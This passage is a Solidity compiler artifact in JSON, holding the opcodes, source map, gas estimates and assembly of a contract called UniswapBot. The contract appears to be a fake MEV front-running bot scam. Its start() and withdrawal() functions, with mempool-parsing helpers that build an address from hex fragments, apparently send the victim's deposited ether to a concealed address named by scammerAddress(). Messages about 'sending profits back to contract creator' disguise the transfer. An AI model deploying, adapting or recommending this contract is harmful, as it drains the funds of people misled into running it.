0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x706 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6BA JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x705 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F8 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x704 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x744 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x754 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7EE JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x792 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A2 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7ED JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7E0 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7EC JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5CD JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x822 PUSH2 0x81D PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x839 PUSH2 0x834 PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH4 0x4B716D2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x879 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x871 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x857 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x892 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x8C5 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x944 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x8E0 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8EC DUP4 PUSH2 0xAC0 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8FD JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x936 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x8CE JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x978 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x9AB JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA29 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9D0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9ED JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9BB JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA9C JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA43 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA60 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xA2E JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF06A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x60F9E SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xADA JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB0F JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB27 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB5F JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220E6F3 0x2F 0x1F 0xF LT 0x4A CALLDATALOAD DUP16 SAR CALLDATACOPY 0xA9 0xA8 PUSH12 0x740DA37A7D83DB8139B04A3D JUMPI 0x2E 0xEF SWAP12 0xDA CREATE PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "520:16871:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;549:23:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;549:23:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;549:23:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;579:25;;5:9:-1;2:2;;;27:1;24;17:12;2:2;579:25:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;579:25:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14131:108;;5:9:-1;2:2;;;27:1;24;17:12;2:2;14131:108:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;15213:187;;;:::i;:::-;;15517:190;;;:::i;:::-;;549:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;579:25::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;14131:108::-;14178:7;14204:27;14217:13;:11;:13::i;:::-;14204:12;:27::i;:::-;14197:34;;14131:108;:::o;15213:187::-;15261:63;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15343:16;:14;:16::i;:::-;15335:34;;:57;15370:21;15335:57;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;15335:57:0;15213:187::o;15517:190::-;15570:58;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15647:19;:17;:19::i;:::-;15639:37;;:60;15677:21;15639:60;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;15639:60:0;15517:190::o;13193:930::-;13239:13;13265:28;13296:48;;;;;;;;;;;;;;;;;;13309:34;13324:18;:16;:18::i;:::-;13309:14;:34::i;:::-;13296:7;:48::i;:::-;13265:79;;13355:16;13374:12;13355:31;;13397:19;13419:10;13397:32;;13440:17;13460:8;13440:28;;13479:19;13501:18;:16;:18::i;:::-;13479:40;;13530:18;13551:17;:15;:17::i;:::-;13530:38;;13581:23;13607:52;13615:14;13631:27;13646:11;13631:14;:27::i;:::-;13607:7;:52::i;:::-;13581:78;;13670:23;13696:69;13704:30;13719:14;13704;:30::i;:::-;13736:28;13751:12;13736:14;:28::i;:::-;13696:7;:69::i;:::-;13670:95;;13776:23;13802:30;13817:14;13802;:30::i;:::-;13776:56;;13843:23;13869:29;13884:13;13869:14;:29::i;:::-;13843:55;;13911:26;13940:69;13948:29;13956:9;13967;13948:7;:29::i;:::-;13979;13987:9;13998;13979:7;:29::i;:::-;13940:7;:69::i;:::-;13911:98;;14020:26;14049;;;;;;;;;;;;;;;;;;14062:12;14049:7;:26::i;:::-;14020:55;;14103:12;14096:19;;;;;;;;;;;;;;13193:930;:::o;8382:939::-;8445:15;8473:16;8498:2;8473:28;;8512:13;8528:1;8512:17;;8540:10;8561;8589:6;8598:1;8589:10;;8584:698;8605:10;8601:1;:14;8584:698;;;8649:3;8640:12;;;;8686:3;8690:1;8686:6;;;;;;;;;;;;;;;;8680:13;;8672:22;;8667:27;;8728:3;8736:1;8732;:5;8728:10;;;;;;;;;;;;;;;;8722:17;;8714:26;;8709:31;;8766:2;8760;:8;;;;8759:25;;;;;8780:3;8774:2;:9;;;;8759:25;8755:232;;;8811:2;8805:8;;;;8755:232;;;8846:2;8840;:8;;;;8839:24;;;;;8860:2;8854;:8;;;;8839:24;8835:152;;;8890:2;8884:8;;;;8835:152;;;8925:2;8919;:8;;;;8918:24;;;;;8939:2;8933;:8;;;;8918:24;8914:73;;;8969:2;8963:8;;;;8914:73;8835:152;8755:232;9012:2;9006;:8;;;;9005:25;;;;;9026:3;9020:2;:9;;;;9005:25;9001:232;;;9057:2;9051:8;;;;9001:232;;;9092:2;9086;:8;;;;9085:24;;;;;9106:2;9100;:8;;;;9085:24;9081:152;;;9136:2;9130:8;;;;9081:152;;;9171:2;9165;:8;;;;9164:24;;;;;9185:2;9179;:8;;;;9164:24;9160:73;;;9215:2;9209:8;;;;9160:73;9081:152;9001:232;9267:2;9262;9257;:7;:12;9247:23;;;;8622:1;8617:6;;;;8584:698;;;;9307:5;9292:21;;;;;;8382:939;;;:::o;14925:111::-;14974:7;15001:27;15014:13;:11;:13::i;:::-;15001:12;:27::i;:::-;14994:34;;14925:111;:::o;16461:114::-;16513:7;16540:27;16553:13;:11;:13::i;:::-;16540:12;:27::i;:::-;16533:34;;16461:114;:::o;8116:91::-;8167:4;8191:8;8184:15;;8116:91;:::o;9880:438::-;9935:13;9963:10;9976:1;9963:14;;9988:6;9997:1;9988:10;;10009:71;10021:1;10016;:6;10009:71;;10039:7;;;;;;;10066:2;10061:7;;;;;;;;;10009:71;;;10090:16;10119:5;10109:16;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;10109:16:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;10109:16:0;;;;10090:35;;10141:6;10148:1;10141:8;;10136:144;10153:5;10151:1;:7;10136:144;;;10188:2;10184:1;:6;;;;;;10180:10;;10226:20;10243:1;10226:10;:20::i;:::-;10205:3;10221:1;10217;10209:5;:9;:13;10205:18;;;;;;;;;;;:41;;;;;;;;;;;10266:2;10261:7;;;;;;;;;10160:3;;;;;10136:144;;;;10306:3;10292:18;;;;;9880:438;;;:::o;16756:630::-;16839:13;16865:23;16897:5;16865:38;;16914:24;16947:6;16914:40;;16967:23;17024:11;:18;17004:10;:17;:38;16993:50;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;16993:50:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;16993:50:0;;;;16967:76;;17054:22;17085:9;17054:41;;17108:6;17125;17150:1;17148:3;;17144:92;17155:10;:17;17153:1;:19;17144:92;;;17211:10;17222:1;17211:13;;;;;;;;;;;;;;;;17194:9;17204:3;;;;;;17194:14;;;;;;;;;;;:30;;;;;;;;;;;17174:3;;;;;;;17144:92;;;17254:1;17252:3;;17248:94;17259:11;:18;17257:1;:20;17248:94;;;17316:11;17328:1;17316:14;;;;;;;;;;;;;;;;17299:9;17309:3;;;;;;17299:14;;;;;;;;;;;:31;;;;;;;;;;;17279:3;;;;;;;17248:94;;;17368:9;17354:24;;;;;;;;16756:630;;;;:::o;12958:88::-;13009:4;13033:5;13026:12;;12958:88;:::o;16365:::-;16415:4;16439:6;16432:13;;16365:88;:::o;14590:327::-;14642:4;14668:1;14663:6;;:1;:6;;:16;;;;;14678:1;14673;:6;;;;14663:16;14659:191;;;14727:1;14714:9;14708:16;;:20;14703:26;;14696:33;;;;14659:191;14763:1;14751:14;;:2;:14;;:32;;;;;14781:2;14775:1;14769:14;;;;14751:32;14747:103;;;14835:2;14831:1;14818:9;14812:16;;:20;:25;14807:31;;14800:38;;;;14747:103;12:1:-1;9;2:12;14590:327:0;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "616400",
								"executionCost": "651",
								"totalCost": "617051"
							},
							"external": {
								"scammerAddress()": "infinite",
								"start()": "infinite",
								"tokenName()": "infinite",
								"tokenSymbol()": "infinite",
								"withdrawal()": "infinite"
							},
							"internal": {
								"_callMEVAction()": "infinite",
								"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"findPtr(uint256,uint256,uint256,uint256)": "infinite",
								"getMemPoolDepth()": "23",
								"getMemPoolHeight()": "23",
								"getMemPoolLength()": "infinite",
								"getMemPoolOffset()": "23",
								"keccak(struct UniswapBot.slice memory)": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"memcpy(uint256,uint256,uint256)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
								"parseMempool(string memory)": "infinite",
								"toHexDigit(uint8)": "213",
								"uint2str(uint256)": "infinite",
								"withdrawalProfits()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 520,
									"end": 17391,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033",
									".code": [
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "6C02A931"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "7B61C320"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "AB1C067D"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "BE9A6555"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH",
											"source": 0,
											"value": "D4E93292"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 520,
											"end": 17391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
